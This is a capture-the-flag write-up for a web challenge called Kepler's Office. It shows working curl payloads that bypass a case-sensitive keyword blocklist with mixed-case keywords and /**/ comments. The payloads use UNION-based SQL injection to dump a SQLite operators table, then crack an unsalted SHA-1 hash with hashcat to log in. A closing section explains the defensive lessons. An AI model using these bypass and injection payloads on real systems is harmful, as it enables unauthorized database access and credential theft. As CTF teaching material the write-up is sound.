# Kepler's Office 1/5 — Operator Console

**Flag:** `reentry{un10n_b4s3d_1nt0_kepl3rs_c0ns0l3}`

| | |
|---|---|
| Category | Web / SQL injection (SQLite) + WAF bypass + hash cracking |
| Target | `https://reentry-...-office-terminal-0-0.chals.io` (per-spawn instance; offline now) |
| Tools | `curl`, `hashcat`/`john` |
| Files | none |

> **Challenge brief:** KEPLER's office terminal is still online — a 1977 operator box that never
> met a security review. Its public reel-catalogue lookup talks to a database, and it isn't fussy
> about what you type into it. Get an operator account and sign in.

---

## Short version

1. `/lookup?reel=` talks to **SQLite** and is **SQL-injectable**.
2. A crude WAF blocks: the **space** character, the literals **`or`/`OR`, `and`/`AND`,
   `union`/`UNION`**, and the tautology **`1=1`**.
3. The WAF's key flaw: it compares the raw string **without `.lower()`** and only for full
   lowercase/UPPERCASE. Mixed case (`UnIoN`, `OpErAtOrS`) passes, and SQLite treats keywords and
   table names **case-insensitively**. The space is replaced by the comment `/**/`.
4. `UNION SELECT` dumps the `operators` table: usernames and **SHA-1** hashes.
5. The `kepler` hash cracks with rockyou → password **`stardust`**.
6. Logging in as `kepler:stardust` redirects to `/console` → the flag.

---

## 1. Recon

```bash
export B="https://<your-instance>.chals.io"
curl -sk "$B/" | sed 's/<[^>]*>//g' | grep -viE '^\s*$' | head
```

Two functions: `GET /lookup?reel=` (reel catalogue, talks to the DB) and `POST /login`
(`username`, `password`). A normal lookup returns **two columns** (`reel`, `note`) — important for
the `UNION SELECT`.

## 2. Detect SQL injection

```bash
curl -sk "$B/lookup?reel=reel-A'"
# db error: unrecognized token: "'reel-A''"   -> SQLite error, input is inside quotes
```

So the query is `SELECT reel, note FROM reels WHERE reel = '<INPUT>'`.

## 3. Map the WAF

Classic payloads return `invalid reel parameter` (an app filter, not the DB). Mapping shows a
**substring blocklist**: `space`, `or`, `and`, `union`, `1=1`. It even blocks `operator`,
`sponsor`, `reunion` etc. because they contain `or`/`and`/`union`. The accounts table is probably
`operators` — which contains `or`.

## 4. Key bypass — the filter is case-sensitive

```bash
curl -sk "$B/lookup?reel=or"   # invalid reel parameter
curl -sk "$B/lookup?reel=Or"   # no reel matched "Or"   <-- PASSED
```

The filter only lists `or`/`OR` (full lower/upper). Mixed case bypasses it. And SQLite keywords
and table names are case-insensitive, so write `UnIoN`, `OpErAtOrS`, and `/**/` for the space.

## 5. Dump via UNION (2 columns)

```bash
# list tables
curl -sk "$B/lookup?reel=zzz'/**/UnIoN/**/SeLeCt/**/name,sql/**/FROM/**/sqlite_master/**/WHERE/**/type='table'--/**/-"
# -> reels, operators ; CREATE TABLE operators (username TEXT, pwhash TEXT, role TEXT)

# dump operators
curl -sk "$B/lookup?reel=zzz'/**/UnIoN/**/SeLeCt/**/username,pwhash/**/FROM/**/OpErAtOrS--/**/-"
# archivist  4e9b800b2c52bd8ef428dbc879196a60cded4854
# kepler     7005fc6dfb402887dfe2c269d9ae294590e54b49
```

40 hex chars → **SHA-1**.

## 6. Crack the hash

```bash
hashcat -m 100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --quiet
# 7005fc6dfb402887dfe2c269d9ae294590e54b49:stardust
```

> **Verification note:** `SHA1("stardust") = 7005fc6dfb402887dfe2c269d9ae294590e54b49`, which
> matches the `kepler` hash exactly. I confirmed this locally. So the login is `kepler:stardust`.

## 7. Log in and read the flag

```bash
curl -sk "$B/login" -c jar.txt --data-urlencode "username=kepler" --data-urlencode "password=stardust"
# 302 -> /console
curl -sk "$B/console" -b jar.txt | grep -oiE "reentry\{[^}]*\}"
# reentry{un10n_b4s3d_1nt0_kepl3rs_c0ns0l3}
```

🚩 **Flag:** `reentry{un10n_b4s3d_1nt0_kepl3rs_c0ns0l3}`

---

## Why it works / lessons

- A blocklist is a bad WAF. Two nails in the coffin here: comparison without case normalization
  (bypass with mixed case), and no block on `/**/` comments (bypass the space ban).
- The correct defense is parameterized queries. `/login` used them and was immune.
- Passwords stored as bare, unsalted SHA-1 are trivially cracked with a wordlist.

> **Next:** [2 - Reel Mirror](2%20-%20Reel%20Mirror.md)
